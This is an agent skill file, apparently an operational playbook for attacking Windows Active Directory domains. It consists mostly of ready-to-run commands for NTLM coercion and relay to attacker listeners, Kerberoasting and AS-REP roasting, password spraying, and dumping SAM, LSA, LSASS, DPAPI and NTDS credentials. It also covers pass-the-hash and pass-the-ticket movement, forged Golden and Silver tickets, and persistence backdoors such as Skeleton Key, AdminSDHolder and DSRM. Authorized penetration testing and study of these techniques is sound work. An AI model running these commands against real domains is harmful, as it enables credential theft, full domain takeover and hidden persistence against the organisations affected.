---
name: active-directory-attack
description: Active Directory penetration testing — BloodHound enumeration, Kerberos attacks (Kerberoasting, AS-REP, Golden/Silver Ticket), NTLM relay, DCSync, lateral movement, domain dominance
metadata:
  type: offensive
  phase: exploitation
  tools: impacket, mimikatz, bloodhound, rubeus, netexec, powerview, responder, kerbrute
  mitre: TA0008
---

# Active Directory Attacks

## When to Activate

- Attacking Windows domain environments
- Kerberos exploitation (Kerberoasting, AS-REP roasting, tickets)
- NTLM relay and lateral movement
- BloodHound enumeration and attack path discovery
- Domain privilege escalation and persistence
- DCSync and credential extraction

## Essential Tools

| Tool | Purpose |
|------|---------|
| BloodHound | AD attack path visualization |
| Impacket | Python AD attack suite |
| Mimikatz | Credential extraction |
| Rubeus | Kerberos attacks |
| NetExec (`nxc`) | Network exploitation — see [`skills/netexec/SKILL.md`](../netexec/SKILL.md) for the canonical reference |
| PowerView | AD enumeration |
| Responder | LLMNR/NBT-NS poisoning |
| Kerbrute | User enumeration & password spray |

## Engagement Spine — Default Playbook (run in order, not just on-demand)

Every authorized internal AD engagement should walk these phases. Each step has a "must-run" check and a callout for the easy-to-miss anti-patterns we've burned ourselves on in past engagements.

### Phase 0 — Unauthenticated recon (no creds yet)

```bash
# Live-host discovery
nmap -sn <subnet> -oA hosts
nxc smb <subnet>                              # SMB banner sweep, signing posture, NetBIOS names

# LDAP signing + channel binding posture (relay-target detection)
nxc ldap <subnet>                             # banner shows signing:None and channel binding state

# Anonymous SMB + RID brute + password policy disclosure
nxc smb <subnet> -u '' -p '' --shares
nxc smb <dc-ip> -u '' -p '' --pass-pol
nxc smb <dc-ip> -u '' -p '' --rid-brute 10000

# Guest fallback (Critical anti-pattern — often forgotten)
nxc smb <subnet> -u guest -p ''               # Per-host: success here = F08-class Guest fallback
nxc smb <dc-ip> -u guest -p '' --rid-brute 10000   # Guest can enumerate users when fallback is on

# Kerberos user-enum (no preauth → no logon noise)
kerbrute userenum -d <domain> --dc <dc-ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
```

> **Always test `guest`/`''` even when the host appears hardened — the F08 Guest-fallback pattern means any unknown username returns a Guest session in many CTF labs and some real AD environments.**

### Phase 1 — First foothold

```bash
# Coercion + relay (if SMB signing or LDAP signing/CB missing)
nxc smb <relayable> -M coerce_plus -o LISTENER=<attacker-ip>
ntlmrelayx.py -tf relay_targets.txt -smb2support --delegate-access
ntlmrelayx.py -t ldap://<dc> --escalate-user <domain-user>     # Add user to DA via ACL write

# AS-REP / Kerberoast / lockout-aware spray
nxc ldap <dc> -u '' -p '' --asreproast asrep.txt               # Public, no auth required if anonymous bind ok
hashcat -m 18200 asrep.txt rockyou.txt
nxc smb <subnet> -u users.txt -p 'Season<year>!' --no-bruteforce --jitter 2-5 --continue-on-success

# Anonymous share looting
nxc smb <subnet> -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true
nxc smb <subnet> -u guest -p '' -M spider_plus -o DOWNLOAD_FLAG=true
```

### Phase 2 — Authenticated enumeration (single domain user in hand)

Always run all of these in parallel the moment any cred lands. The "first auth move" includes LAPS — over-delegated LAPS read on a standard user is a recurring finding.

```bash
USER=<user>; PW='<pw>'; DC=<dc-ip>; DOMAIN=<domain.local>

# 1) LAPS read — does this user have ms-Mcs-AdmPwd on any computer? (over-delegation finding)
nxc ldap $DC -u $USER -p "$PW" -M laps

# 2) BloodHound full collection
bloodhound-python -u $USER -p "$PW" -d $DOMAIN -ns $DC -c All --zip

# 3) Kerberoast + AS-REP roast (authenticated)
nxc ldap $DC -u $USER -p "$PW" --kerberoasting kerb.txt
nxc ldap $DC -u $USER -p "$PW" --asreproast asrep.txt

# 4) ADCS template audit — ESC1-15 detection
certipy-ad find -u $USER@$DOMAIN -p "$PW" -dc-ip $DC -vulnerable -enabled -stdout
# If LDAPS broken (DC has no cert), Certipy auto-falls-back to LDAP — check that the bind succeeded

# 5) Share spider with creds
nxc smb <subnet> -u $USER -p "$PW" -M spider_plus -o DOWNLOAD_FLAG=true

# 6) User-description harvest (admins leak hints there)
nxc ldap $DC -u $USER -p "$PW" --user-desc

# 7) Delegation audit (RBCD / unconstrained / constrained)
nxc ldap $DC -u $USER -p "$PW" --find-delegation --trusted-for-delegation
```

### Phase 3 — First local admin obtained

Whenever you `(Pwn3d!)` any host — even before pursuing domain rights — sweep credential stores in this exact order:

```bash
HOST=<ip>; CRED='-u <user> -p <pw>'   # add --local-auth if local SAM compromise

# 1) SAM hashes — for pass-the-hash sweep
nxc smb $HOST $CRED --sam

# 2) LSA secrets — cleartext domain credentials cached on member servers
nxc smb $HOST $CRED --lsa

# 3) LSASS scrape — fresh Kerberos tickets + cleartext from logged-in users
nxc smb $HOST $CRED -M lsassy

# 4) DPAPI — saved RDP creds, browser passwords, vault entries
nxc smb $HOST $CRED --dpapi nosystem

# 5) Profile-dir hunt — interactive users leave artifacts (ConsoleHost_history, Desktop notes)
nxc smb $HOST $CRED -x 'cmd.exe /c dir C:\Users'
# For each interesting profile:
nxc smb $HOST $CRED -x 'cmd.exe /c type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
```

> **DPAPI vault decryption is one of the most under-used pivots.** From local admin, the user's DPAPI master keys + DPAPI machine key + the user's password (or the LSA-cached version) decrypts every saved credential blob — saved RDP creds in particular often yield a second domain account. We caught the F13 lapsus pivot exactly this way.

### Phase 4 — Domain admin obtained

The moment you reach DA (or any DCSync-capable identity), execute the credential-validation sweep:

```bash
DC=<ip>; CRED='-u <da-user> -p <pw>'

# 1) Dump NTDS to ~/.nxc/logs/ntds/<HOST>_<IP>_<TS>.ntds
nxc smb $DC $CRED --ntds

# 2) Extract paired user/hash lists (skip disabled + machine accts)
NTDS=$(ls -t ~/.nxc/logs/ntds/*.ntds | head -1)
grep -vi disabled "$NTDS" | awk -F: '$1 !~ /\$$/ {print $1":"$4}' > /tmp/pairs.txt
cut -d: -f1 /tmp/pairs.txt > /tmp/users.txt
cut -d: -f2 /tmp/pairs.txt > /tmp/hashes.txt

# 3) Paired PtH spray — maps where each cred is local admin domain-wide
nxc smb <subnet> -u /tmp/users.txt -H /tmp/hashes.txt --no-bruteforce --continue-on-success
nxc smb <subnet> -u /tmp/users.txt -H /tmp/hashes.txt --no-bruteforce --continue-on-success --local-auth

# 4) Cross-forest hash collision audit (if a second forest is in scope)
# Use skills/scripts/ntds_diff.py — see "Cross-forest password reuse" section below
```

### Phase 5 — Cross-forest opportunism

If two or more forests are in scope, **always diff their NTDS dumps** for NT-hash collisions. Same-hash pairs across forests = same plaintext password = single credential pivot between unrelated identity domains, even without a forest trust.

```bash
# After DCSync of both forests:
python3 skills/scripts/ntds_diff.py /tmp/forestA.ntds /tmp/forestB.ntds
```

Cross-forest collisions are routinely missed because operators don't think to compare NTDS dumps; they treat each forest as its own engagement. The Lehack2024 engagement found 4 in-scope cross-forest pairs (jesse↔jesse for DA, plus three regular-user pairs), all from operators applying the same passwords twice during two-forest provisioning.

### Phase 5.5 — Kerberos auth without /etc/hosts or system NTP

When the engagement Kali has no passwordless sudo (common on shared lab boxes) and the AD realm doesn't resolve via DNS, normal `nxc -k --use-kcache` fails with `[Errno -2] Name or service not known` on the `<REALM>:88` lookup. When the DC is also clock-skewed, Kerberos AS-REQ fails with `KRB_AP_ERR_SKEW`. Use `skills/scripts/nxc_kerberos_wrapper.py` — it injects a `socket.getaddrinfo` shim and a `datetime` offset before exec'ing nxc, so every nxc Kerberos flag Just Works:

```bash
# 1. Mint TGT (NT hash via -hashes, AES key via -aesKey for Protected Users members)
impacket-getTGT <realm>/<user> -aesKey <aes256-from-ntds> -dc-ip <dc-ip>

# 2. Configure the wrapper for this realm
export NXC_HOSTS='armorique.local=10.3.10.13,village.armorique.local=10.3.10.13,village=10.3.10.13'
export NXC_OFFSET=-10800   # Kali is 3h ahead of DC
export KRB5CCNAME=$PWD/<user>.ccache

# 3. Use nxc as normal — every flag works
python3 skills/scripts/nxc_kerberos_wrapper.py smb village.armorique.local -k --use-kcache --shares --users --pass-pol
python3 skills/scripts/nxc_kerberos_wrapper.py ldap village.armorique.local -k --use-kcache --kerberoasting roast.txt
```

> **Protected Users members can only auth with AES.** When the target user is in Protected Users, NTLM returns `STATUS_ACCOUNT_RESTRICTION` and RC4 Kerberos returns `KDC_ERR_ETYPE_NOSUPP`. Pass `-aesKey <AES256-from-NTDS>` to `impacket-getTGT` — the NT hash won't work.

> **Protected Users blocks S4U2Proxy.** Even when a Protected Users member has `TRUSTED_TO_AUTH_FOR_DELEGATION` and `msDS-AllowedToDelegateTo` configured, their TGT is non-forwardable by design — `KDC_ERR_BADOPTION` ("initial TGT not forwardable") on the S4U2Proxy step. This is a common defense-in-depth configuration that *neutralizes* the delegation without removing the bad config; report the misconfiguration anyway as a hygiene finding.

### Phase 6 — Persistence demo (with explicit operator approval)

```bash
# Golden ticket (krbtgt hash + domain SID)
impacket-ticketer -nthash <krbtgt-nt> -domain-sid <sid> -domain <domain> Administrator

# Silver ticket (machine-account hash + SPN)
impacket-ticketer -nthash <machine-nt> -domain-sid <sid> -domain <domain> -spn cifs/<host>.<domain> Administrator

# AdminSDHolder ACL backdoor (creates persistent DA-equivalent path)
# See "Persistence Mechanisms" below for the full syntax
```

> **OPSEC reminder:** Golden tickets, AdminSDHolder, and DSRM persistence must be documented in the engagement report so the defender can clean up. Never leave persistence artifacts unannounced.

---

## Core Workflow

### Step 1: Kerberos Clock Sync

Kerberos requires ±5 minutes clock synchronization:

```bash
# Detect clock skew
nmap -sT 10.10.10.10 -p445 --script smb2-time

# Fix clock on Linux
sudo date -s "14 APR 2026 18:25:16"

# Fix clock on Windows
net time /domain /set

# Fake clock without changing system time
faketime -f '+8h' <command>
```

### Step 2: AD Reconnaissance with BloodHound

```bash
# Start BloodHound
neo4j console
bloodhound --no-sandbox

# Collect data with SharpHound (Windows)
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Python collector (Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### Step 3: PowerView Enumeration

```powershell
# Domain info
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# User enumeration
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# Group enumeration
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# Find local admin access
Find-LocalAdminAccess -Verbose
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

## Credential Attacks

### Password Spraying

```bash
# Kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# NetExec — see netexec/SKILL.md "Password Spraying" for the full set of flags
nxc smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --jitter 2-5 --continue-on-success
```

### Kerberoasting

```bash
# NetExec built-in — see netexec/SKILL.md "Kerberoasting"
nxc ldap dc.domain.local -u user -p pass --kerberoasting hashes.txt

# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# Crack tickets
hashcat -m 13100 hashes.txt rockyou.txt
# Or: john --wordlist=rockyou.txt --format=krb5tgs hashes.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /outfile:hashes.txt /creduser:DOMAIN\user /credpassword:pass
```

### AS-REP Roasting (No Pre-Auth Required)

```bash
# Find users with DONT_REQ_PREAUTH
Get-DomainUser -PreauthNotRequired
# Or BloodHound: MATCH (u:User {dontreqpreauth:true}) RETURN u

# NetExec built-in — works with just a userlist, no creds required
nxc ldap dc.domain.local -u users.txt -p '' --asreproast asrep.txt

# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.10 -no-pass

# Crack
hashcat -m 18200 asrep.txt rockyou.txt

# Rubeus
Rubeus.exe asreproast /outfile:asrep.txt
```

## NTLM Relay Attacks

### Responder (LLMNR/NBT-NS Poisoning)

```bash
responder -I eth0 -wrf

# With WPAD poisoning
responder -I eth0 -A

# Analyze captured hashes
python3 /opt/Responder/tools/RunFinger.py -i 10.10.10.0/24
```

### NTLM Relay to SMB/LDAP

```bash
# Relay to SMB (requires SMB signing disabled)
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (create computer account + RBCD)
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

# Relay to AD CS (ESC8)
ntlmrelayx.py -t http://adcs.domain.local/certsrv/certfnsh.asp -smb2support
```

### SMB Signing Check

```bash
nxc smb 10.10.10.0/24 --gen-relay-list relayable.txt
# Or check individually:
nmap -p445 --script smb-security-mode 10.10.10.10
```

## Lateral Movement

### Pass-the-Hash

```bash
# NetExec — preferred for cmd exec + sweep validation across hosts
nxc smb 10.10.10.10 -u user -H NTLM_HASH -x 'whoami'
nxc smb 10.10.10.0/24 -u user -H NTLM_HASH         # domain-wide PtH sweep
nxc smb 10.10.10.0/24 -u user -H NTLM_HASH --local-auth   # local SAM PtH

# Impacket — interactive shell
psexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
wmiexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
smbexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
```

> See netexec/SKILL.md "Authentication" for the full set of PtH variants
> (paired -u/-H files, --local-auth, --no-bruteforce, Kerberos `-k`).

### Pass-the-Ticket

```bash
# Export ticket (Rubeus)
Rubeus.exe dump /nowrap
# Or: Rubeus.exe triage

# Convert to Kirbi (if needed)
Rubeus.exe ticket /ticket:base64string

# Pass ticket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py domain.local/user@10.10.10.10 -k -no-pass
```

### DCSync (Domain Replication)

```bash
# Requires: Replicating Directory Changes rights

# Impacket — full NTDS via DRSUAPI replication
impacket-secretsdump -just-dc domain.local/user:password@10.10.10.10

# NetExec — drops the dump in ~/.nxc/logs/ntds/<HOST>_<IP>_<TS>.ntds.
# See netexec/SKILL.md "NTDS.dit (Domain Controller)" for the full options
# (--ntds vss, --user filter, --enabled), then chain into the post-DCSync
# PtH validation sweep documented in the same skill.
nxc smb 10.10.10.10 -u user -p password --ntds
nxc smb 10.10.10.10 -u user -p password --ntds --user Administrator
nxc smb 10.10.10.10 -u user -p password --ntds vss     # VSS fallback method

# Mimikatz (single-account DCSync)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

## Kerberos Ticket Attacks

### Golden Ticket (KRBTGT Hash)

```bash
# Requires: KRBTGT NTLM hash + Domain SID
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt

# Rubeus
Rubeus.exe golden /rc4:HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /ptt

# Impacket
ticketer.py -nthash HASH -domain-sid SID -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@DC_IP
```

### Silver Ticket (Service Account Hash)

```bash
# Requires: Service account NTLM hash + SPN
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:HASH /user:Administrator /ptt

# Access target service
dir \\server.domain.local\c$
```

### Diamond Ticket (Forged TGT)

```bash
# Forged ticket that looks legitimate (includes real PAC)
Rubeus.exe diamond /rc4:HASH /user:Administrator /domain:domain.local /sids:S-1-5-21-xxx-512 /ptt
```

### Sapphire Ticket

```bash
# Similar to Diamond but with more realistic PAC structure
Rubeus.exe sapphire /rc4:HASH /user:Administrator /domain:domain.local /sids:S-1-5-21-xxx-512 /ptt
```

## Persistence Mechanisms

### Skeleton Key

```bash
mimikatz # privilege::debug
mimikatz # misc::skeleton
# Now any user can authenticate with "mimikatz" as password
```

### AdminSDHolder

```powershell
# Modify AdminSDHolder ACL (persists across DA changes)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All
```

### DSRM Backdoor

```powershell
# Dump DSRM hash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Enable DSRM admin logon
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name DsrmAdminLogonBehavior -Value 2

# Pass DSRM hash
psexec.py -hashes :DSRM_HASH domain.local/Administrator@DC_IP
```

### DCShadow

```bash
# Requires: DA + Schema Admin rights
# Register rogue DC
lsadump::dcshadow /object:targetUser /attribute:userAccountControl /value=512

# Push changes
lsadump::dcshadow /push
```

## OPSEC Considerations

**Must Not:**
- Lock out accounts with excessive password spraying
- Modify production AD objects without approval
- Leave Golden Tickets without documentation

**Should:**
- Run BloodHound for attack path discovery
- Check SMB signing before relay attacks
- Verify patch levels for CVE exploitation

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Clock skew too great | Sync time with DC or use faketime |
| Kerberoasting returns empty | No service accounts with SPNs |
| DCSync access denied | Need Replicating Directory Changes rights |
| NTLM relay fails | Check SMB signing, try LDAP target |
| BloodHound empty | Verify collector ran with correct creds |
